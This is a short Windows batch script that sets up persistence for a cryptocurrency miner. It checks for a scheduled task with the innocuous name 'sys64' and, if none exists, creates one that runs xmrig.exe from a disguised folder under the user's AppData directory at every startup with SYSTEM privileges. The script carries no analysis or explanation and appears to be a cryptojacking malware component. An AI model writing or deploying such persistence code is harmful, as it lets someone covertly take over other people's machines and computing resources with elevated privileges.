@echo off
	schtasks /query /TN "sys64" >NUL 2>&1
	if %errorlevel% NEQ 0 schTasks /Create /SC ONSTART /TN "sys64" /TR "%USERPROFILE%\AppData\Local\Microsoft\Windows\SYS64\xmrig.exe" /RU SYSTEM
	exit /b 0